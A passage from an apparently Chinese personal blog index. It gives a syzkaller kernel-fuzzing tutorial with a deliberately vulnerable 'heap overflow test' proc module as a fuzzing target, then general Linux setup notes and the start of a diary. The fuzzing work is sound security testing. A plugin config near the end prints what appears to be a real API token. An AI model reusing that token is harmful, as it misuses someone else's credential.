gcc-7.4.0.tar.gz`（或者`tar -Jxvf gcc-7.4.0.tar.xz`）\n- 下载安装依赖项：在解压完的源码包中，执行./contrib/download_prerequisites（需更改base_url为http://mirror.linux-ia64.org/gnu/gcc/infrastructure/，如果执行时一直没有进度，考虑加上sudo权限执行）。若执行不成功，则需自行下载安装，步骤如下。\n\n```\ngcc7.4.0依赖的gmp,mpfr和mpc版本如下：\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\n安装过程参考链接：\nhttps://blog.csdn.net/lwbeyond/article/details/77718040（主要参考该文档）\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\n安装gmp到configure步骤时，出现“no usable m4”错误：\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n# 3 x86-64 linux kernel in qemu\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是x86-64，是使用qemu模拟出来的。\n\n## 3.1 编译syzkaller\n\n### 3.1.1 搞定go环境\n\ngo官网：[https://golang.org/dl](https://golang.org/dl/)\n\n```shell\nwget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz\ntar -xf go1.14.2.linux-amd64.tar.gz\nmv go goroot\nmkdir gopath\nexport GOPATH=`pwd`/gopath\nexport GOROOT=`pwd`/goroot\nexport PATH=$GOPATH/bin:$PATH\nexport PATH=$GOROOT/bin:$PATH\n```\n\n- goroot/ 存放go源码\n\n- gopath/ 是go的工作目录\n\n需要将它们都添加到环境变量`~/bashrc`中去，然后再`source ~/.bashrc`更新一下环境变量。\n\n### 3.1.2 下载syzkaller源码\n\n```shell\ngo get -u -d github.com/google/syzkaller/prog\n```\n\n不要小瞧这一行代码，如果不把代理配置好，咱们在国内的同学可是要下哭。关于代理的配置，之后有空再更新文章吧。\n\n### 3.1.3 编译syzkaller\n\n```shell\ncd gopath/src/github.com/google/syzkaller/\nmake\n```\n\n这里需要注意，如果是在虚拟机中编译，要把虚拟机内存给多一点，比如8G。（我一开始只给了虚拟机4G内存，结果编译不通过）\n\n编译通过后，就可以在syzkaller的bin/下看到二进制文件啦。\n\n ![](syzkaller-mgr.png)\n\n## 3.2 编译linux kernel\n\nlinux kenrel github链接：[https://github.com/torvalds/linux](https://github.com/torvalds/linux)\n\n### 3.2.1 一切顺利的情况\n\n1. 下载linux源码\n\n```shell\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n```\n\n2. 生成配置文件\n\n```shell\ncd $kernel\nmake defconfig\nmake kvmconfig\n```\n\n3. 更改.config文件对内核的配置选项或者使用`make menuconfig`进行配置\n\n```shell\n# Coverage collection.\nCONFIG_KCOV=y\n\n# Debug info for symbolization.\nCONFIG_DEBUG_INFO=y\n\n# Memory bug detector\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\n\n# Required for Debian Stretch\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n4. 重新生成config文件\n\n```shell\nmake olddefconfig\n```\n\n5. 开始编译内核\n\n```shell\nmake -j4\n```\n\n编译完成后，可以在如下目录中看到vmlinux和bzImage文件\n\n```shell\n$ ls $KERNEL/vmlinux\n$KERNEL/vmlinux\n$ ls $KERNEL/arch/x86/boot/bzImage\n$KERNEL/arch/x86/boot/bzImage\n```\n\n### 3.2.2 若gcc版本过低\n\n最初有一次使用gcc 7.1.0编译最新版kernel时出错`“You are building kernel with non-retpoline compiler, please update your compiler..”`。查阅了一些资料显示，是由于retpoline只有gcc7.3.0及以上的版本才支持，因此需要在本地编译一个高版本gcc，并使用如下方式指定make时的编译器。以gcc8.0.1为例，编译过程如下：\n\n```shell\ncd $KERNEL\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" defconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" kvmconfig\n```\n\n然后更改.config文件中的选项，使其支持我们需要的一些功能\n\n```shell\nCONFIG_KCOV=y\nCONFIG_DEBUG_INFO=y\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n保存完该文件后，编译\n\n```shell\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" oldconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" -j4\n```\n\n编译完成后，可以看到vmlinux（kernel binary）和bzImage（packed kernel image）。\n\n![](syzkaller-vmlinux.png)\n\n## 3.3 配置qemu vm\n\n1. 安装qemu\n\n使用一条简单的命令即可：\n\n```shell\nsudo apt-get install qemu-system-x86\n```\n\n2. 生成image\n\n使用debootstrap构建linux启动镜像：\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# 可以使用./create-image.sh -h查看更多帮助选项\n```\n\n完成之后目录内容如下：\n\n```shell\nbling@Ubuntu1804:~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1月   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1月   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1月   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1月   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1月   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1月   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1月   9 09:04 stretch.img\n```\n\n3. 启动虚拟机\n\n启动虚拟机试试\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/s_image/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee vm.log\n```\n\n对以上各参数我的理解如下：\n\n```\n-kernel xxx/bzImage：用bzImage作为内核镜像，qemu的这个功能用来测试不同内核非常方便。\n-append cmdline：将cmdline作为内核的命令行参数\n-hda xxx/xxx.img：指定xxx.img作为硬盘镜像\n-net user,hostfwd=tcp::10021-:22 -net nic：客户机与宿主机之间通过指定的端口进行通讯\n-enable-kvm：开启kvm虚拟化\n-nographic：非图形界面启动\n-m 2G：分配2G内存给虚拟系统\n-smp 2：指定虚拟机由2个CPU\n-pidfile xxx.pid：将qemu进程pid储存在xxx.pid这个文件中\n2>&1 | tee vm.log：将执行过程中的输出同时定向到标准输出和vm.log文件中\n```\n\n参考了两篇文章：（1）[hostfwd的问题](https://blog.csdn.net/tzwsoho/article/details/80303088) （2）[make 2>&1 | tee log.txt 命令解析](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemu启动起来之后，运行ssh测试一下是否连通，便于后期syzkaller运行出错时定位问题。\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\n曾经有一次连接时在这里出了问题，宿主机上ssh无法连接到虚拟机。原因如下：\n\n由于上一步中create-image.sh中如下eth0跟实际qemu虚拟机中运行的网卡名称不一样，导致网卡没有分配IP地址。最后解决方法如下：qemu启动虚拟机，root用户身份登录后，设置网卡IP地址。\n\n![](syzkaller-ethnet.png)\n\n参考文章：（1）[网卡没分配IP地址的解决方法](https://blog.csdn.net/wuzhong8809/article/details/83374140)（2）[rsa公私钥知识点](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)（3）[一个自己生成公私钥配置的方法](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# 关闭qemu虚拟机\nkill $(cat vm.pid)\n```\n\n## 3.4 启动syzkaller\n\n为了使syzkaller运行起来，在syzkaller目录下，新建一个workdir目录，并新建一个config文件用于配置运行所需参数（命名为xxx.cfg）\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfg文件的格式如下，根据实际情况各参数可做更改：\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n执行成功后，如下图所示：\n\n![](syzkaller-running.png)\n\n\n\n# 4 arm64 android kernel goldfish\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是arm64，是使用goldfish模拟出来的。\n\n待补充...\n\n\n\n# 5 定制\n\n> 对于新的内核接口，增加系统调用描述\n\n## 5.1 syz-extract和syz-sysgen\n\nsyzkaller在编译的时候，默认不会编译syz-extract这个模块。因此我们需要手工编译一下。\n\n在syzkaller源码目录下，执行如下命令：\n\n```\nmake bin/syz-extract\n```\n\n如果syz-sysgen也没默认编译的话，执行如下命令：\n\n```\nmake bin/syz-sysgen\n```\n\n他俩的关系是这样的：\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\n我们针对某个驱动接口写出xxx.txt，然后使用syz-extract利用txt和源码生成const文档，最后执行syz-sysgen时syzkaller会根据txt和const生成一个go文件。可在sys/linux/gen/amd64.go和executor/syscalls.h中看到结果。\n\n## 5.2 一次定制示例\n\n- 编写一个有漏洞的驱动接口，并将其编译进内核（或者使用打ko的方式）。\n- 编写驱动接口对应的txt文件，将其放入syzkaller/sys/linux目录下，生成go文件并重新编译syzkaller。\n- 运行syzkaller，改config文件指定fuzz接口提高速率，最后分析crash。\n\n### 5.2.1 构造一个内核模块的漏洞\n\n1. 在`kernel_src/drivers/char`目录下，新建一个testxy.c。内容如下，这是一个有漏洞的内核模块。\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/proc_fs.h>\n#include <linux/uaccess.h>\n#include <linux/slab.h>\n\n#define MY_DEV_NAME \"test\"\n#define DEBUG_FLAG \"PROC_DEV\"\n\nstatic ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff);\nstatic ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff);\nstatic int proc_open (struct inode *proc_inode, struct file *proc_file);\nstatic struct file_operations a = {\n                                .open = proc_open,\n                                .read = proc_read,\n                                .write = proc_write,\n};\n\n\nstatic int __init mod_init(void)\n{\n    struct proc_dir_entry *test_entry;\n    const struct file_operations *proc_fops = &a;\n    printk(DEBUG_FLAG\":proc init start!\\n\");\n\n    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops);\n    if(!test_entry)\n       printk(DEBUG_FLAG\":there is somethings wrong!\\n\");\n\n    printk(DEBUG_FLAG\":proc init over!\\n\");\n    return 0;\n}\n```\n\n2. 打开char/目录下的Kconfig文件，添加：\n\n```shell\nconfig TESTXY_MODULE\n        tristate \"heap overflow test\"\n        default y\n        help\n          This file is to test a buffer overflow.\n```\n\n3. 打开char/目录下的Makefile文件，添加：\n\n```shell\nobj-$(CONFIG_TESTXY_MODULE) += testxy.o\n```\n\n若/linux/drivers/char/是新目录，还需修改/linux/drivers/Kconfig（加上source \"drivers/char/Kconfig\"）；修改/linux/drivers/Makefile（加上obj-$(CONFIG_TEST_MODULE) += char/）。\n\n4. make menuconfig时可以在`Device Drivers -> Character devices -> Heap Overflow Test` (*表示直接编如内核，M表示模块形式) 处看到刚刚添加的测试模块。\n\n```shell\nmake clean\nmake menuconfig\nmake -j8\n```\n\n5. 用新的内核启动虚拟机，查看模块是否加载成功\n\n```shell\n# 查看模块对应设备节点是否存在\nls /proc/test\n# 查看模块加载时的log信息\ndmesg | grep \"proc init\"\n```\n\n### 5.2.2 定制txt系统调用描述文件\n\n1. syzkaller源码中，找到sys/linux/目录，新建一个文件，命名为`proc_operation.txt`，内容如下：\n\n```\ninclude <linux/fs.h>\n\nopen$proc(file ptr[in, string[\"/proc/test\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\nread$proc(fd fd, buf buffer[out], count len[buf]) len[buf]\nwrite$proc(fd fd, buf buffer[in], count len[buf]) len[buf]\nclose$proc(fd fd)\n\nproc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\nproc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n```\n\n2. 使用syz-extract生成const文件。指定txt文件名，可单独生成该文件对应的const文件。\n\n```shell\nbin/syz-extract -os linux -sourcedir \"/home/bling/Downloads/linux-5.5.1\" -arch amd64 proc_operation.txt\n```\n\n3. 运行syz-sysgen\n4. 重新编译syzkaller\n\n```shell\nmake clean\nmake\n```\n\n### 5.2.3 验证能否成功触发crash\n\n启动syzkaller的配置文件如下。为了更快看到crash结果，增加了“enable_syscalls”项，只允许某些系统调用，效率更快。\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"enable_syscalls\":[\n        \t\t\"open$proc\",\n        \t\t\"read$proc\",\n        \t\t\"write$proc\",\n        \t\t\"close$proc\"\n        ],\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n启动syzkaller进行测试：\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\n触发到漏洞分支！\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n## 5.3 txt文件语法\n\nhttp://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller-demo.html\n\n## 5.4 config文件\n\n[config文件示例](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/testdata/qemu.cfg)\n\n[config文件参数详解](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n# 编译ko的方法\n\ntest.c\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n \nMODULE_LICENSE(\"Dual BSD/GPL\");\n \nstatic int hello_init(void)\n{\n        printk(KERN_ALERT \"Hello, world\\n\");\n        return 0;\n}\n \nstatic void hello_exit(void)\n{\n        printk(KERN_ALERT \"Goodbye, cruel world\\n\");\n}\n \nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nMakefile\n\n```shell\nobj-m := testxy.o\n\nKDIR = /home/bling/Downloads/linux-5.5.1/\n\nall:\n        make -C $(KDIR) M=$(PWD) modules \n\nclean:\n        rm -rf *.o *.ko *.mod.* *.symvers *.order\n```\n\n\n\n# 参考文章推荐\n\n[内核漏洞挖掘技术系列(4)——syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[【漏洞挖掘】使用Syzkaller&QEMU捕捉内核堆溢出Demo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n\n\n\n\n\n\n","categories":["Fuzzing"]},{"title":"temp","url":"/2019/01/01/temp/","content":"\n# 1 解决ubuntu中\"Could not get lock /var/lib/dpkg/lock\"\n\n[How to Fix ‘E: Could not get lock /var/lib/dpkg/lock’ Error in Ubuntu Linux](https://itsfoss.com/could-not-get-lock-error/)\n\n[How To Fix \"Could not get lock /var/lib/dpkg/lock - open (11 Resource temporarily unavailable)\" Errors](https://www.linuxuprising.com/2018/07/how-to-fix-could-not-get-lock.html)\n\n\n\n# 2 虚拟机相关\n\n## vmware\n\n### 安装vmware-tools\n\n- 点击菜单栏中“虚拟机” --> “安装vmware tools”\n- 此时虚拟机中会有一个CD driver\n- 点击CD driver，将其中的VMware tar包拷贝到本地目录\n- 解tar包\n- 进解开的tar包目录，用sudo执行vmware-xxx.pl文件安装即可\n\n### 安装open-vm-tools\n\n```shell\nsudo apt update\nsudo apt install open-vm-tools\n//桌面版还需安装如下包，以支持双向拖拽文件\nsudo apt install open-vm-tools-desktop\n```\n\n共享文件夹：\n\n- 在线方式\n\n```\n//虚拟机开机的情况下，在“虚拟机”-->“设置”-->“选项”中设置好共享文件夹\n//便可以在/mnt/hgfs/xxx共享目录访问了\n//如果这样不可访问的话，就参照离线方式的命令执行一遍\n```\n\n- 离线方式\n\n```shell\n//先将虚拟机关机，在“虚拟机”-->“设置”-->“选项”中设置好共享文件夹\n//使用如下命令可以查看共享目录设置是否成功\nvmware-hgfsclient\n//再进入虚拟机中\nmkdir /mnt/hgfs\ncd /mnt\nsudo chmod 777 ./hgfs\nsudo chown bling:bling hgfs -R\nvmhgfs-fuse .host:/ /mnt/hgfs\n```\n## virtual box\n\nvirtual box增强功能\n\n安装增强功能 https://blog.csdn.net/caoleiwe/article/details/78583676\n\n设置共享文件夹 https://blog.csdn.net/skylake_/article/details/53132499\n\n\n# 3 Kali 2020版中文显示乱码的解决方案\n\n安装完2020最新kali中文版后，发现界面出现了无数“麻将块”。原因是该版本对中文的不支持，因此需要我们自己安装一下中文字体。\n\n## 更改kali的镜像源\n\n在sources.list中添加一个源：\n\n```shell\nvim /etc/apt/sources.list\n\n# tsinghua university\ndeb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\n```\n\n添加完源之后，必须立马执行更新命令：\n\n```shell\nsudo apt-get update\n```\n\n## 安装中文字体\n\n依次执行以下命令：\n\n```shell\n# 安装本地设置\nsudo apt-get install locales\nlocale -a\n# 安装中文字体\nsudo apt-get install xfonts-intl-chinese\nsudo apt-get install ttf-wqy-microhei\n#重启kali\nsudo reboot\n```\n\n## reference\n\n[2019kali中文乱码](https://www.cnblogs.com/ainv-123/p/12158303.html)\n\n[解决安装kali 2020.1版本后的中文乱码问题](https://blog.csdn.net/weixin_45604567/article/details/104156673)\n\n[什么是locale？](https://wiki.ubuntu.org.cn/Locale)\n\n# 4 win10 安装ubuntu1804双系统\n\n过程主要参考了以下两篇博客：\n\n[win10下装ubuntu双系统（免U盘）](https://www.jianshu.com/p/417c1001a559)\n\n[Windows + Linux 双系统的安装](https://blog.csdn.net/fanxueya1322/article/details/90205143)\n\n## 第一步：制作启动u盘\n\n我使用的ultraISO，网上很多教程。\n\n## 第二步：创建磁盘分区\n\n在windows中空出500G（我要经常用ubuntu系统，所以空出的多，实际上50G也可以）未分配的磁盘。\n\n桌面上电脑图标--》右键选择管理--》磁盘管理，然后划分一块未分配的磁盘（在要分配的磁盘上右键--》压缩卷）。\n\n## 第三步：禁用快速启动\n\n控制面板--》系统和安全--》电源选项--》选择电源按钮的功能--》更改当前不可用的设置。将该界面的“启用快速启动”选项前的勾去掉。保存修改。\n\n## 第四步：关闭安全启动\n\n重启进入bios设置\n\n## 第五步：安装过程\n\n重启进入bios，并选择从u盘启动。其中只有以下一点需要注意。\n\n有一步选择是否安装到windows旁边时：\n\n1、选择along side windows，继续下一步不需要手动划分磁盘，它就自动把我之前空出的500G给用了。（不知道为啥，误打误撞发现这样也可以安装上双系统）\n\n2、如果想自己划分磁盘的话，一定要记得选“其他”，然后设置分区。\n\n## 再次启动\n\n我用的方法比较笨，在开机的一瞬间，需要一直按ESC键（惠普电脑）进入开机选项，然后选择F9。进入F9后就可以选择是启动windows还是启动ubuntu啦。\n\n# 5 ubuntu 1804 安装搜狗输入法\n\n在官网下载linux版搜狗输入法的deb安装包，下载到本地后，执行以下三条命令\n\n```shell\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\nsudo apt --fix-broken install\nsudo dpkg -i sogoupinyin_2.3.1.0112_amd64.deb\n```\n\n在settings -> Region& Language -> Manage Installed Languages中把Keyboard input method system从IBus修改为fcitx。然后点击Apply System Wide。最后重启电脑。\n\n重启完成后，在系统中搜索fcitx configuration，点击左下角的加号，取消勾选Only Show Current Language，然后选择Sougou Pinyin，OK一下就可以了。\n\n现在就可以通过ctrl+shift切换输入法！\n\n# 6 Linux上安装samba服务\n\n## 6.1 ubuntu环境\n\n（1）安装smb服务\n\n```shell\nsudo apt update\nsudo apt install samba\nwhereis samba\n```\n\n（2）指定共享文件夹\n\n```shell\nsudo vim /etc/samba/smb.conf\n\t[sambashare]\n    \t\tcomment = Samba on Ubuntu\n    \t\tpath = /any/folder/\n    \t\tread only = no\n    \t\tbrowsable = yes\nsudo service smbd restart\nsudo ufw allow samba （ps：如果没有防火墙或者防火墙未开启，这一步可省略）\n```\n\n（注意： /any/folder/需要将folder权限设置为777，这样才能正常访问）\n\n（3）指定访问用户\n\n```shell\nsudo smbpasswd -a username\n```\n\nusername是ubuntu上的一个普通用户。\n\n（4）windows上访问\n\n```shell\n//ubuntu-ip/sambashare\n```\n\nwindows访问如上地址就可以进入到/any/folder/目录了！\n\n\n\n## 6.2 redhat环境\n\n\n\n参考：\n\n[ubuntu上设置samba服务](https://ubuntu.com/tutorials/install-and-configure-samba#1-overview)\n\n[redhat上设置samba服务](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/sect-managing_confined_services-samba-configuration_examples)\n\n\n\n# 7 Linux上添加/删除用户\n\nubuntu添加新用户：\n\n```shell\nadduser bling\n```\n\n将用户添加到root组\n\n```shell\nsudo chmod u+w /etc/sudoers\nsudo vim /etc/sudoers\n\t在root下方添加：bling ALL(ALL:ALL) ALL\nsudo chmod u-w /etc/sudoers\n```\n\n删除用户：\n\n```shell\ndeluser bling\n```\n\n# 8 Linux上安装java jdk\n\n这里以openjdk为例，如果需要安装oracle Java JDK，请用参考链接中的方式。\n\n```shell\n# 更新软件包列表\nsudo apt-get update\n# 安装openjdk-8-jdk\nsudo apt-get install openjdk-8-jdk\n# 查看java版本，验证是否安装成功\njava -version\n```\n\n参考：\n\n[Ubuntu 18.04安装Java JDK8三种方式](https://blog.csdn.net/zbj18314469395/article/details/86064849)\n\n# 10 Linux上升级python\n\n## 10.1 ppa源升级\n\n- 添加ppa源，安装python 3.6\n\n```shell\nsudo add-apt-repository ppa:jonathonf/python-3.6\nsudo apt-get update\nsudo apt-get install python3.6\n```\n\n- 调整python3的优先级的方法见5.2\n\n## 10.2 源码升级\n\n- 去官网下载所需版本的python源码包。\n\n[python源码网址](https://www.python.org/ftp/python/)\n\n- 安装依赖\n\n```shell\nsudo apt-get install gcc make zlib1g-dev\nsudo apt-get install libbz2-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install python3-dev libxml2-dev libffi-dev libssl-dev libxslt1-dev\n```\n\n- 开始安装\n\n```shell\ntar -zxvf Python-3.6.7.tgz\nsudo mv Python-3.6.7 /usr/local\ncd /usr/local/Python-3.6.7\n./configure\nsudo make\nsudo make install\n```\n\n- 更改python版本优先级\n\n查询python安装路径：`whereis python`\n\n调整优先级，将新安装的3.6调到最大：\n\n```shell\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 100\nsudo update-alternatives --install /usr/bin/python python /usr/local/bin/python3.6 200\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.5 150\n```\n\n到这一步就算是结束了，此时使用`python --version`可以看到python已经是3.6版本的了。\n\n- 后续设置变更\n\n```shell\n# 查询可配置的python\nupdate-alternatives --list python\n# 切换默认python版本\nupdate-alternatives --config python\n```\n\n参考：\n\n[Ubuntu 16.04 升级Python版本到3.6](https://www.jianshu.com/p/738f08dfe1f8)\n\n[Ubuntu 16.04 源码安装Python-3.6.7](https://www.jianshu.com/p/43e0e25bc0d0)\n\n[linux中安装Thrift（指定版本）](https://blog.csdn.net/xc_zhou/article/details/82593854)\n\n\n\n# 11 Linux下生成/应用patch\n\n## 普通patch\n\n1. 为单个文件生成patch\n\n   `diff -up /oldFilePath /newFilePath > file.patch`\n\n   参数说明:\n\n   -u 显示有差异行的前后几行(上下文), 默认是前后各3行, 这样, patch中带有更多的信息.\n\n   -p 显示代码所在的c函数的信息.\n\n2. 为多个文件生成patch `diff -uprN /oldFolderPath /newFolderPath > folder.patch`\n\n   参数说明:\n\n   -r 递归地对比一个目录和它的所有子目录(即整个目录树).\n\n   -N 如果某个文件缺少了, 就当作是空文件来对比. 如果不使用本选项, 当diff发现旧代码或者新代码缺少文件时, 只简单的提示缺少文件. 如果使用本选项, 会将新添加的文件全新打印出来作为新增的部分.\n\n3. linux打补丁\n\n   `patch -p1 < demo.patch`\n\n   生成的补丁中, 路径信息包含了你的Linux源码根目录的名称, 但其他人的源码根目录可能是其它名字, 所以, 打补丁时, 要进入你的Linux源码根目录, 并且告诉patch工具, 请忽略补丁中的路径的第一级目录(参数-p1).\n\n   diff命令必须在整个Linux源码的根目录的上一级目录中执行.\n\n4. solaris打补丁\n\n   `gpatch -p1 < demo.patch`\n\n例如：\n\n```\npatch -p1 < huawei_patch/huawei_tf_gic_0001.patch\npatch -p1 < huawei_patch/huawei_tf_gic_0002.patch\n```\n\n## git patch\n\nhttps://juejin.im/post/5b5851976fb9a04f844ad0f4\n\n# 12 ssh\n\n安装命令：\n\n```shell\n# 客户端\nsudo apt-get install ssh  或者 sudo apt-get installopenssh-client\n# 服务端\nsudo apt-get install openssh-server\n```\n\nssh服务命令：\n\n```shell\nsudo/etc/init.d/ssh start\nsudo/etc/init.d/ssh restart\nsudo/etc/init.d/ssh stop\n```\n\n配置文件：\n\n```shell\n# 更改ssh配置文件前最好先备份一个\nsudo cp/etc/ssh/sshd_config /etc/ssh/sshd_config.original\n# 可以在如下配置文件中修改Port端口号（默认是22），PermitRootLogin等\nvim /etc/ssh/sshd_config\n```\n\n生成ssh key免密登录：\n\n```shell\n# 在客户端生成用于登录的公私钥，生成后位于~/.ssh/目录下\nssh-keygen -t rsa -b 4096 -C \"xxx@mail.com\"\n# 将公钥拷贝到远端服务器的~/.ssh/目录下，并重命名为authorized_keys\nscp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys\n```\n\n参考：\n\n[Generating a new SSH key and adding it to the ssh-agent](https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)\n\n\n\n# 13 Windows上使用Linux\n\n[windows 上运行linux](https://www.jianshu.com/p/e81fe9db1ebb)\n\n[不用装双系统，直接在 Windows 上体验 Linux：Windows Subsystem for Linux](https://sspai.com/post/43813)\n\n\n# 14 ubuntu设置静态ip\n1、更改interfaces文件中的内容\n\n```shell\nsudo vim /etc/network/interfaces\n\nauto enp0s8\niface enp0s8 inet static\naddress 192.168.56.116\nnetmask 255.255.255.0\ngateway 192.168.56.1\n```\n\n2、刷新ip\n\n```shell\nsudo ip addr flush enp0s8\nsudo systemctl restart networking.service\n```\n\n3、设置重启后依然生效\n\n```shell\nsudo vim /etc/NetworkManager/NetworkManager.conf\n》将NetworkManager.conf中managed=false改为managed=true\nsudo service network-manager restart\n```\n\n参考文章如下：\n\n[ubuntu 16.04 设置静态IP](https://www.jianshu.com/p/d69a95aa1ed7)\n\n# 恢复符号表\n\n## lscan -自动检测二进制和哪个库最相近\n\nhttps://github.com/maroueneboubakri/lscan\n\n需要先安装[pyelftools](https://github.com/eliben/pyelftools) 和 [pefile](https://github.com/erocarrera/pefile)\n\n```shell\npython ./lscan.py -S .sig的目录 -f 要扫描的二进制文件\n```\n\n## IDA flair\n\n在[sig-database](https://github.com/push0ebp/sig-database)中寻找合适的sig文件，或者自己[制作sig文件](https://github.com/blingblingxuanxuan/working/blob/master)\n\n## Rizzo\n\n## binaryai\n\n```shell\npip install --upgrade binaryai\nbinaryai install_ida_plugin\n```\n\nC:\\Users\\x00500195\\AppData\\Roaming\\Hex-Rays\\IDA Pro\\cfg\\binaryai.cfg\n\n```\n{\n    \"token\": \"e9e72683-71a5-4e6d-81ed-8bf6b4a76449\",\n    \"url\": \"https://binaryai.tencent.com/api/v3/endpoint\",\n    \"topk\": 10,\n    \"minsize\": 5,\n    \"threshold\": 0.90\n}\n```","categories":["Others"]},{"title":"things","url":"/1994/10/23/things/","content":"\n# 2020\n\n## 0523\n\n忙碌的一天\n\n- 8:40被电话吵醒去营业厅办宽带。\n- 10:20喊物业来家里修水池。\n- 11:00外卖到了，吃早午饭。\n- 11:30装宽带的师傅来安装光猫，调试。\n- 12:50跟氕氕约着一起去按摩肩颈疏通下经络，然后又刮了个痧，现在整个背又痛又不能看。但是真的舒服。\n- 15:30去公司赶项目报告。\n- 